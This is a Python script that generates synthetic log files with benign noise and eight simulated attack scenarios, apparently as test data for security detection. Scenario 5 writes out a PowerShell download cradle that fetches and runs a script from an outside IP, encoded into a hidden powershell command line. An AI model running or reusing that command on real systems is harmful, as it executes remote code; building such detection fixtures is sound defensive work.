"""Generate realistic benign log noise plus 8 simulated attack scenarios."""
import base64
import json
import os
import random
from datetime import datetime, timedelta, timezone

USERS = ["alice", "bob", "carol", "dave", "erin", "frank"]
DOMAINS = ["google.com", "microsoft.com", "github.com", "office.com", "slack.com",
           "cloudflare.com", "stackoverflow.com", "wikipedia.org", "zoom.us"]
EXTERNAL = ["8.8.8.8", "1.1.1.1", "142.250.80.46", "151.101.1.69", "13.107.42.14"]


def iso(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S+00:00")


def generate(out_dir, seed=7, start=None, hours=2):
    rnd = random.Random(seed)
    os.makedirs(out_dir, exist_ok=True)
    start = start or (datetime.now(timezone.utc).replace(microsecond=0) - timedelta(hours=hours))
    auth, win, fw, dns = [], [], [], []

    def at(minutes, seconds=0):
        return start + timedelta(minutes=minutes, seconds=seconds)

    def w(t, eid, computer, **f):
        d = {"TimeCreated": iso(t), "EventID": eid, "Computer": computer}
        d.update(f)
        win.append((t, json.dumps(d)))

    def ssh(t, ok, user, ip, host="web01", invalid=False):
        port = rnd.randint(30000, 60000)
        if ok:
            msg = f"Accepted password for {user} from {ip} port {port} ssh2"
        else:
            who = f"invalid user {user}" if invalid else user
            msg = f"Failed password for {who} from {ip} port {port} ssh2"
        auth.append((t, f"{iso(t)} {host} sshd[{rnd.randint(1000, 9999)}]: {msg}"))

    def fwlog(t, src, dst, bytes_out, action="allow", dport=443):
        fw.append((t, f"{iso(t)} fw01 action={action} src={src} dst={dst} dport={dport} proto=tcp bytes_out={bytes_out}"))

    def dnslog(t, host, domain):
        dns.append((t, f"{iso(t)} host={host} query={domain} type=A"))

    # ---------- benign noise ----------
    total = hours * 60
    for _ in range(400):
        t = at(rnd.uniform(0, total))
        u = rnd.choice(USERS)
        n = rnd.randint(1, 30)
        w(t, 4624, f"WS-{n:03d}", TargetUserName=u, IpAddress=f"10.0.1.{n}", LogonType=2)
    for _ in range(25):  # occasional typo
        t = at(rnd.uniform(0, total))
        w(t, 4625, "DC01", TargetUserName=rnd.choice(USERS), IpAddress=f"10.0.1.{rnd.randint(1, 30)}", LogonType=3)
    for _ in range(60):
        ssh(at(rnd.uniform(0, total)), True, rnd.choice(["deploy", "ops"]), f"10.0.2.{rnd.randint(2, 20)}")
    for _ in range(800):
        n = rnd.randint(1, 30)
        fwlog(at(rnd.uniform(0, total)), f"10.0.1.{n}", rnd.choice(EXTERNAL), rnd.randint(500, 60000))
    for _ in range(1200):
        n = rnd.randint(1, 30)
        dnslog(at(rnd.uniform(0, total)), f"WS-{n:03d}", rnd.choice(DOMAINS))

    # ---------- attack scenarios ----------
    # 1. SSH brute force then success (T+10m)
    ip = "185.220.101.4"
    for i in range(12):
        ssh(at(10, i * 5), False, ["root", "admin"][i % 2], ip, invalid=(i % 2 == 1))
    ssh(at(11, 5), True, "deploy", ip)

    # 2. Password spray against DC (T+20m)
    guesses = USERS + ["administrator", "svc_sql", "svc_backup", "helpdesk", "test", "guest", "it", "hr", "finance"]
    for i, u in enumerate(guesses):
        w(at(20, i * 10), 4625, "DC01", TargetUserName=u, IpAddress="45.155.205.9", LogonType=3)

    # 3. Impossible travel (T+30m, T+45m)
    w(at(30), 4624, "DC01", TargetUserName="alice", IpAddress="203.0.113.10", LogonType=10)
    w(at(45), 4624, "DC01", TargetUserName="alice", IpAddress="198.51.100.7", LogonType=10)

    # 4. DNS beaconing from WS-014 (T+35m, every 30s)
    for i in range(16):
        dnslog(at(35, i * 30), "WS-014", "cdn-update.badsite.xyz")

    # 5. Encoded PowerShell on WS-014 (T+40m)
    payload = "IEX(New-Object Net.WebClient).DownloadString('http://91.92.109.3/a.ps1')"
    b64 = base64.b64encode(payload.encode("utf-16le")).decode()
    w(at(40), 4688, "WS-014", SubjectUserName="bob",
      NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      CommandLine=f"powershell.exe -NoP -W Hidden -enc {b64}")

    # 6. Privileged group modification (T+41m)
    w(at(41), 4728, "DC01", SubjectUserName="bob", TargetUserName="Domain Admins", MemberName="svc_backup2")

    # 7. Security log cleared (T+42m)
    w(at(42), 1102, "WS-014", SubjectUserName="bob")

    # 8. Data exfiltration from WS-022 to threat-intel IP (T+50m)
    for i in range(6):
        fwlog(at(50, i * 30), "10.0.1.22", "91.92.109.3", 25_000_000)

    for name, rows in (("auth.log", auth), ("windows.jsonl", win), ("firewall.log", fw), ("dns.log", dns)):
        rows.sort(key=lambda r: r[0])
        with open(os.path.join(out_dir, name), "w", encoding="utf-8") as f:
            f.write("\n".join(line for _, line in rows) + "\n")
    return {"auth": len(auth), "windows": len(win), "firewall": len(fw), "dns": len(dns)}
